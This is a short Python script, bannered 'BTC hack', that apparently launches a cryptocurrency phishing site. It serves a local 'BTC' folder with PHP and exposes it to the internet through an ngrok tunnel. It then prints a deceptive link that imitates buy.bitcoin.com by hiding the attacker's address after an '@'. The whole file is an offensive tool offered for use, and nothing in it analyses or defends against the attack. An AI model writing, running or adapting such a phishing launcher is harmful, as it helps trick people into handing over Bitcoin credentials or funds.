import os
from colorama import Fore
import pyfiglet
from pyngrok import ngrok
from subprocess import Popen
print(Fore.GREEN)
os.system("clear")
ins =pyfiglet.figlet_format("BTC hack", font="3-d")
print(Fore.RED+ins)
with open("server","w") as phplog:
    Popen(("php","-S","localhost:4040","-t","BTC"),stderr=phplog ,stdout=phplog)
link=ngrok.connect(4040,"http")
print(link)
print(Fore.GREEN+" youcan send link :https://buy.bitcoin.com-@yourlink")
input("")
